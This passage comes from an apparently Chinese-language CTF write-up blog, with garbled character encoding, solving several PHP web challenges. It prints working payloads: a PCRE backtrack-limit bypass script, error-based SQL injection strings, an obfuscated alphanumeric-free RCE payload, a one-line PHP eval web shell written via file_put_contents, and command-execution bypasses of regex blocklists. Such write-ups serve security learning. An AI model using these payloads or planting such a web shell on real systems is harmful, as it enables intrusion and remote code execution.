data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vdXNlLXBjcmUtYmFja3RyYWNrLWxpbWl0LXRvLWJ5cGFzcy1yZXN0cmljdC5odG1s\">p ç¥æ–‡ç« </span></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://node4.anna.nssctf.cn:28802/&#x27;</span>  </span><br><span class=\"line\">data=<span class=\"string\">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`nl /f*`;?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span>+<span class=\"string\">&quot;@&quot;</span>*<span class=\"number\">1000000</span>+<span class=\"string\">&#x27;&quot;&#125;&#x27;</span>  </span><br><span class=\"line\"><span class=\"comment\">#è¿™é‡Œå¿…é¡»ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦,@$ä¹‹ç±»çš„éƒ½æ˜¯å¯ä»¥çš„</span></span><br><span class=\"line\">a=requests.post(url=url,data=&#123;<span class=\"string\">&#x27;letter&#x27;</span>:data&#125;)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(a.text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1\tNSSCTF&#123;6fc410f7-bc4a-423f-b62d-81cd0dc8cbd9&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#è¿™é‡Œindex.phpæ²¡æœ‰é—­åˆ&lt;?æ‰€ä»¥è¦å…ˆç”¨?&gt;é—­åˆ</span></span><br></pre></td></tr></table></figure>\n<p>å¦å¤–:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=?&gt;æ—¶ä¸€ç§PHPçŸ­æ ‡è®°æ–¹å¼,é‡Œé¢å¯ä»¥è¾“å…¥PHPä»£ç æ‰§è¡Œ,ä¸”è¾“å‡ºæ—¶ä¸ç”¨echo,ç›´æ¥è¾“å…¥å†…å®¹å°±è¡Œ,è¿™é‡Œç”¨``æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤,å†ç”¨&lt;?=?&gt;è¾“å‡º</span><br></pre></td></tr></table></figure>\n<h2 id=\"34nisactf-2022join-us\"><a class=\"markdownIt-Anchor\" href=\"#34nisactf-2022join-us\">#</a> 34.[NISACTF 2022]join-us</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;#   message: txw4ever</span><br><span class=\"line\">1&#x27; order by 3# ä¸è¦è€å°å¿ƒæ€å–”~</span><br><span class=\"line\">å¯è§æ­¤é¢˜æœ‰è¿‡æ»¤</span><br><span class=\"line\">æŠ¥é”™æ³¨å…¥,æ²¡æœ‰ç¦ç”¨extractvalue</span><br><span class=\"line\">1&#x27;||extractvalue(0,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like &#x27;sqlsql&#x27;)))#</span><br><span class=\"line\"></span><br><span class=\"line\">XPATH syntax error: &#x27;~Fal_flag,output&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">ç„¶åcolumnè¢«ç¦ç”¨,é‡‡ç”¨joinæ‹¼æ¥ç»•è¿‡</span><br><span class=\"line\">1&#x27;||extractvalue(0,concat(0x7e,(select *from (select *from output a join output b)c)))#</span><br><span class=\"line\"></span><br><span class=\"line\">Duplicate column name &#x27;data&#x27;</span><br><span class=\"line\">æˆªå–è¯•è¯•</span><br><span class=\"line\">1&#x27;||extractvalue(0,concat(0x7e,substr((select group_concat(data) from sqlsql.output),1,31)))#</span><br><span class=\"line\"></span><br><span class=\"line\">substrè¢«ç¦ç”¨,ç”¨mid</span><br><span class=\"line\">1&#x27;||extractvalue(0,concat(0x7e,mid((select group_concat(data) from sqlsql.output),1,20)))#</span><br><span class=\"line\"></span><br><span class=\"line\">å†å°†1,20æ¢æˆ20,40å’Œ40,60</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"35swpuctf-2021-æ–°ç”Ÿèµ›hardrce_3\"><a class=\"markdownIt-Anchor\" href=\"#35swpuctf-2021-æ–°ç”Ÿèµ›hardrce_3\">#</a> 35.[SWPUCTF 2021 æ–°ç”Ÿèµ›] hardrce_3</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;wllm&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$wllm</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;wllm&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$blacklist</span> = [<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;\\^&#x27;</span>, <span class=\"string\">&#x27;\\~&#x27;</span>, <span class=\"string\">&#x27;\\|&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">foreach</span> (<span class=\"variable\">$blacklist</span> <span class=\"keyword\">as</span> <span class=\"variable\">$blackitem</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$blackitem</span> . <span class=\"string\">&#x27;/m&#x27;</span>, <span class=\"variable\">$wllm</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;å°ä¼™å­åªä¼šå¼‚æˆ–å’Œå–åï¼Ÿä¸å¥½æ„æ€å“¦LTLTè¯´ä¸èƒ½ç”¨ï¼ï¼&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/[a-zA-Z0-9]/is&#x27;</span>, <span class=\"variable\">$wllm</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Ra&#x27;sAlGhulè¯´ç”¨å­—æ¯æ•°å­—æ˜¯æ²¡æœ‰çµé­‚çš„ï¼&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">eval</span>(<span class=\"variable\">$wllm</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>æ¯«æ— ç–‘é—®çš„æ— å­—æ¯æ•°å­— rce, è¿‡æ»¤äº†ï½å’Œ ^, ä¸èƒ½å–åå’Œå¼‚æˆ–åªèƒ½è‡ªå¢</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//æµ‹è¯•å‘ç°7.0.12ä»¥ä¸Šç‰ˆæœ¬ä¸å¯ä½¿ç”¨</span><br><span class=\"line\">//ä½¿ç”¨æ—¶éœ€è¦urlç¼–ç ä¸‹</span><br><span class=\"line\">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br><span class=\"line\">å›ºå®šæ ¼å¼ æ„é€ å‡ºæ¥çš„ assert($_POST[_]);</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æ—¶å‘ç°_=phpinfo (); å¯ä»¥ï¼Œä½†æ˜¯ system (),passthru ä¸€å †ç³»ç»Ÿæ‰§è¡Œå‡½æ•°ä¸èƒ½ç”¨ï¼Œåº”è¯¥è¢«ç¦ç”¨äº†ï¼Œè¿™é‡Œç”¨ file_put_contents ç»•è¿‡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_=file_put_contents(&#x27;zoe.php&#x27;,&#x27;&lt;?php eval($_POST[zoe]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure>\n<p>ç„¶åèšå‰‘è¿ä¸Šå°±è¡Œ</p>\n<h2 id=\"36uuctf-2022-æ–°ç”Ÿèµ›ez_rce\"><a class=\"markdownIt-Anchor\" href=\"#36uuctf-2022-æ–°ç”Ÿèµ›ez_rce\">#</a> 36.[UUCTF 2022 æ–°ç”Ÿèµ›] ez_rce</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## æ”¾å¼ƒæŠŠï¼Œå°ä¼™å­ï¼Œä½ çœŸçš„ä¸ä¼šRCE,ä½•å¿…åœ¨æ­¤çº ç»“å‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$code</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\\$|\\*|\\+|\\^|scan|\\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>, <span class=\"variable\">$code</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;çœ‹çœ‹ä½ è¾“å…¥çš„å‚æ•°ï¼ï¼ï¼ä¸å«æ ·å­ï¼ï¼&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">eval</span>(<span class=\"variable\">$code</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;ä½ æƒ³å¹²ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;å±…ç„¶éƒ½ä¸è¾“å…¥å‚æ•°ï¼Œå¯æ¶!!!!!!!!!&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ä¸€å¼€å§‹çœ‹é¢˜ç›®æ ‡ç­¾æ— å‚ rce, æˆ‘è¿˜åœ¨æƒ³ç€å¼‚æˆ–å–åè‡ªå¢ï¼Œå‘ç° $ è¢«è¿‡æ»¤äº†ï¼Œçœ‹äº† wp æ‰å‘ç° printf è¿™ä¸ªå‡½æ•°ä¹Ÿèƒ½è¿™ä¹ˆ NB</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=printf(`l\\s /`);</span><br><span class=\"line\">?code=printf(`c\\at /fffffffffflagafag`);</span><br></pre></td></tr></table></figure>\n<h2 id=\"37hnctf-2022-week1easy_html\"><a class=\"markdownIt-Anchor\" href=\"#37hnctf-2022-week1easy_html\">#</a> 37.[HNCTF 2022 Week1]easy_html</h2>\n<p>F12 &gt; ç½‘ç»œ -&gt; è¯·æ±‚å¤´</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hint:select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>\n<p>ä¼ ä¸ªç‰¹æ®Šçš„:ffifdyop<br>\n è¿›å…¥ä¸‹ä¸€å…³ï¼Œä»–è¯´ä»”ç»†æƒ³æƒ³åœ¨å“ªé‡Œæ‰¾çº¿ç´¢ï¼Œç›´æ¥æŸ¥çœ‹æºä»£ç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$x</span>= <span class=\"variable\">$GET</span>[<span class=\"string\">&#x27;x&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$y</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;y&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span> != <span class=\"variable\">$y</span> &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$x</span>) == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$y</span>))&#123;</span><br><span class=\"line\">;</span><br></pre></td></tr></table></figure>\n<p>å¼±ç±»å‹æ•°ç»„ç»•è¿‡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?x[]=1&amp;y[]=2</span><br></pre></td></tr></table></figure>\n<p>ç„¶åä¸‹ä¸€å…³</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;wqh&#x27;</span>] !== <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dsy&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;wqh&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dsy&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">echo</span> <span class=\"variable\">$FLAG</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ç®€å•çš„å¼ºæ¯”è¾ƒç›´æ¥æ•°ç»„ç»•è¿‡</p>\n<h2 id=\"38wustctf-2020æœ´å®æ— å\"><a class=\"markdownIt-Anchor\" href=\"#38wustctf-2020æœ´å®æ— å\">#</a> 38.[WUSTCTF 2020] æœ´å®æ— å</h2>\n<p>é¦–å…ˆæç¤ºäººé—´æä¹ bot<br>\n è®¿é—® robots.txt, è¿›å…¥æç¤ºçš„æ–‡ä»¶åœ¨åœ¨è¯·æ±‚å¤´ä¸­æ‰¾åˆ° /fl4g</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//level 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>])) 